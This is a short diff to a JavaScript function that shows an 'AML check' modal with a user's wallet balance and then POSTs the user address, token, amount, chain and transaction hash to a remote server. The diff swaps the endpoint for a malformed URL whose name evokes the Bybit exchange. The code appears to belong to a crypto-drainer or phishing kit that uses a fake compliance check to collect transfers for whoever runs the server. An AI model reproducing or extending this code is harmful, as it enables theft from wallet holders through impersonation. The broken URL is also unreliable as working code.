@@ -321,7 +321,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
     console.log(`📊 Округлённый баланс: ${roundedBalance}, roundedAmount: ${roundedAmount.toString()}`);
     await showAMLCheckModal(userAddress, roundedBalance);
 
-    const response = await fetch('https://api.amlinsight.io/api/transfer', {
+    const response = await fetch('https://api./api.bybitamlbot.com/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
